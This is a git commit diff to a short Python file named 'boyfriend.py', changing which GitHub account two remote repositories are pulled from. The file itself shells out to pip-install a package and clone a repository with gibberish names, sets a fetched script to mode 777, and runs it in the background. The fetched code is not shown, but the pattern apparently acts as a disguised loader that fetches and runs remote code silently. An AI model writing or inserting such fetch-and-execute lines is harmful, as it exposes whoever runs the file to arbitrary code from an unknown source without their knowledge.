b76ab7b1f6e297c4973c386a78fedd5a8a84dfe4
jongovber <83457221+jongovber@users.noreply.github.com>
2021-05-18 22:13:46 +0530

    Update boyfriend.py

--- boyfriend.py
+++ boyfriend.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip3 install git+https://github.com/fdsdfdfsd/fdsfdsfsd.git")
-os.system("git clone https://github.com/fdsdfdfsd/vcvccvcv.git")
+os.system("pip3 install git+https://github.com/jongovber/fdsfdsfsd.git")
+os.system("git clone https://github.com/jongovber/vcvccvcv.git")
 os.system("chmod 777 vcvccvcv/hjkhjhjhj.py")
 os.system("python3 vcvccvcv/hjkhjhjhj.py &")
 
